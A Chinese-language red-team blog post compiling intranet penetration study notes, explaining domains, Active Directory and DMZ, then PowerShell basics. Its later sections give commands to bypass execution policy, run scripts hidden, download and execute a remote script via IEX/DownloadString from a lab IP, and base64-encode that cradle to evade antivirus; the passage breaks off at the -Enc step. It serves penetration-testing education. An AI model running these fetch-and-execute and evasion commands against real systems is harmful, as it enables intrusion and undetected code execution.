<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="【建议收藏】内网学习笔记合集, TeamsSix">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7704006270618117"
     crossorigin="anonymous"></script>
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150271429-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-150271429-1');
</script>


    <title>【建议收藏】内网学习笔记合集 | TeamsSix</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="TeamsSix" type="application/atom+xml">
</head>



   <style>
    body{
       background-image: url(/medias/featureimages/0.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">TeamsSix</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">TeamsSix</div>
        <div class="logo-desc">
            
              I can do all this through him who gives me strength. (Philippians 4:13 NIV)
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210907113159.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">【建议收藏】内网学习笔记合集</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #567ddf;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #567ddf;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                <span class="chip bg-color">红队</span>
                            </a>
                        
                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                <span class="chip bg-color">学习笔记</span>
                            </a>
                        
                            <a href="/tags/%E5%86%85%E7%BD%91/">
                                <span class="chip bg-color">内网</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
                                内网学习笔记
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-10-27
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2021-11-22
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    42.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    181 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自 2020 年 11 月份至 2021 年 10 月份，在这近一年的时间里，笔者更新了自己在学习内网过程中的 30 余篇笔记，并将笔记同步更新到了自己的公众号、博客、CSDN 等平台，特在此整理成合集发布出来。</p>
<p>建议收藏本文，随时翻阅查看。</p>
<blockquote>
<p>本文首发在我的个人公众号和个人博客，欢迎关注我的公众号：TeamsSix，我的博客：<a target="_blank" rel="noopener" href="https://teamssix.com/">teamssix.com</a></p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
<h1 id="0x01-内网常见名词解释"><a href="#0x01-内网常见名词解释" class="headerlink" title="0x01 内网常见名词解释"></a>0x01 内网常见名词解释</h1><h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p>
<p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
<p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p>
<p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p>
<h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p>
<p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p>
<h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p>
<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p>
<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p>
<p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p>
<h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p>
<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p>
<p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p>
<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p>
<p>多个域树可以组成一个域林。</p>
<h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p>
<p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p>
<p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p>
<p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p>
<p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/%E5%9F%9F%E6%9E%97.png" alt="域林"></p>
<h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p>
<p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p>
<p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p>
<h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
<p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p>
<h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p>
<p><strong>域本地组</strong></p>
<p>成员范围：所有的域；使用范围：自己所在的域</p>
<p><strong>全局组</strong></p>
<p>成员范围：自己所在的域；使用范围：所有的域</p>
<p><strong>通用组</strong></p>
<p>成员范围：所有的域；使用范围：所有的域</p>
<p><strong>A-G-DL-P 策略</strong></p>
<p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p>
<ul>
<li>A 表示用户账号</li>
<li>G 表示全局组</li>
<li>U 表示通用组</li>
<li>DL 表示域本地组</li>
<li>P 表示资源权限</li>
</ul>
<h1 id="0x02-PowerShell"><a href="#0x02-PowerShell" class="headerlink" title="0x02 PowerShell"></a>0x02 PowerShell</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p>
<p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p>
<p>PowerShell 有如下特点：</p>
<ul>
<li>Windows 7 以上的操作系统默认安装</li>
<li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li>
<li>可以从另一个系统中下载 PowerShell 脚本并执行</li>
<li>目前很多工具都是基于 PowerShell 开发的</li>
<li>很多安全软件检测不到 PowerShell 的活动</li>
<li>cmd 通常会被阻止运行，但是 PowerShell 不会</li>
<li>可以用来管理活动目录</li>
</ul>
<p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-Host

Name             : ConsoleHost
Version          : 5.1.18362.1171
InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3c
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : zh-CN
CurrentUICulture : zh-CN
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.18362.1171
PSEdition                      Desktop
PSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;
BuildVersion                   10.0.18362.1171
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Windows 操作系统对应的 PowerShell 版本信息：</p>
<p>1.0        windows server 2008</p>
<p>2.0        windows server 2008 r2、windows 7</p>
<p>3.0        windows server 2012、windows 8</p>
<p>4.0        windows server 2012 r2、windows 8.1</p>
<p>5.0        windows 10</p>
<p>5.1        windows server 2016</p>
<h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p>
<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p>
<p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; Get-ExecutionPolicy
Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行策略有以下几种：</p>
<p><strong>Restricted</strong>：不能运行脚本</p>
<p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p>
<p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p>
<p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p>
<p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted

执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): A

PS C:\WINDOWS\system32&gt; Get-ExecutionPolicy
Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; C:\t.ps1
hello TeamsSix

PS C:\Users\teamssix&gt; cd C:\

PS C:\&gt; .\t.ps1
hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p>
<p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p>
</blockquote>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p>
<p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\&gt; Get-Process | Sort-Object ID

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
      0       0       60          8                 0   0 Idle
   3038       0      208       4760                 4   0 System
      0      12     7732      81344                88   0 Registry
     53       3     1160        752               368   0 smss
    256      10     2468       7424               424   0 svchost
    662      21     1788       4668               504   0 csrss
    160      11     1364       5660               580   0 wininit
    653      27    18592     177580               588   1 csrss
   1219      67    59660         52       2.59    600   1 WinStore.App
    278      14     3108      15656               684   1 winlogon
    687      11     5420       9432               724   0 services<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote>
<p>-NoLogo：启动不显示版权标志的PowerShell</p>
<p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p>
<p>-NoProfile (-NoP)：不加载当前用户的配置文件</p>
<p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p>
<p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p>
<p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p>
<p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p>
</blockquote>
<p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p>
<h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre class="line-numbers language-none"><code class="language-none">新建目录test：New-Item test -ItemType directory
删除目录test：Remove-Item test
新建文件test.txt：New-Item test.txt -ItemType file
新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;
删除文件test.txt：Remove-Item test.txt
查看文件test.txt内容：Get-Content  test.txt
设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;
给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;
清除文件test.txt内容：Clear-Content test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p>
<p>先来看看默认受限模式下执行脚本的情况</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicy
Restricted

PS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1
无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?
LinkID&#x3D;135170 中的 about_Execution_Policies。
    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者简写</p>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p>
<p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;172.16.214.1:8000&#x2F;t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 –Enc 指定 Base64 编码内容</p>
